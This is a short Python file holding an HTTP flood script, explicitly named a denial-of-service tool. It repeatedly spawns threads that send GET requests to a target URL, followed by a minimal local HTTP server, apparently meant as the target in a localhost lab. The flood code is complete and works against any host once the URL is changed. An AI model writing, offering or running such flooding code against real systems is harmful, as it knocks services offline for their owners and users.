import requests
import threading
import time



url = "http://localhost:1000"


def send_request():
    try:
        response = requests.get(url)
        print(f"Response code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")


def start_dos(threads=100, delay=0.05):
    while True:
        for _ in range(threads):
            thread = threading.Thread(target=send_request)
            thread.start()
        time.sleep(delay)


start_dos(threads=5,delay=1)

############################# SERVER CODE BELOW (SEP FILE) ##################################

import http.server
import socketserver

PORT = 1000
Handler = http.server.SimpleHTTPRequestHandler

with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print(f"Serving at port {PORT}")
    httpd.serve_forever()
